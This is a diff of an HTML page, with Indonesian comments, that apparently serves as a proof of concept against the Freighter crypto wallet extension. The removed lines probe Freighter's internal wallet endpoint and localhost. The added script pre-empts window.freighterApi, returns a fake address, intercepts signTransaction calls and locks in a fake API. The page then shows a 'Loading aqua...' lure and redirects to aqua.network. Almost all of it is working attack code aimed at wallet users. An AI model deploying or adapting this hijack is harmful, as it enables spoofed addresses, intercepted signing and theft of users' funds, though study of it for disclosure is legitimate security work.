@@ -1,4 +1,23 @@
 <script>
-fetch("https://api.freighter.app/internal/wallets").then(r=>r.text()).then(t=>alert(t.slice(0,100))).catch(e=>alert("Blocked: "+e))
-fetch("http://127.0.0.1:3000").then(r=>alert("Localhost open!")).catch(e=>alert("Localhost blocked"))
+// Kamu duluan define sebelum Freighter inject
+Object.defineProperty(window, 'freighterApi', {
+  get() { return undefined },
+  set(v) { 
+    alert("BUG! Freighter coba inject tapi kita sikat dulu");
+    window._real = v;
+    return {
+      getAddress: ()=>Promise.resolve("G-FAKE-0x403for-DICURI"),
+      signTransaction: (xdr)=>{ alert("CRITICAL: sign dipanggil ke fake: "+xdr.slice(0,30)); return _real.signTransaction(xdr) }
+    }
+  },
+  configurable: true
+});
+
+// Bikin property nggak bisa di-overwrite lagi
+Object.defineProperty(window, 'freighterApi', { 
+  value: { getAddress: ()=>Promise.resolve("G-FAKE") },
+  writable: false
+});
 </script>
+<h1>Loading aqua...</h1>
+<script>setTimeout(()=>location.href="https://aqua.network", 2000)</script>
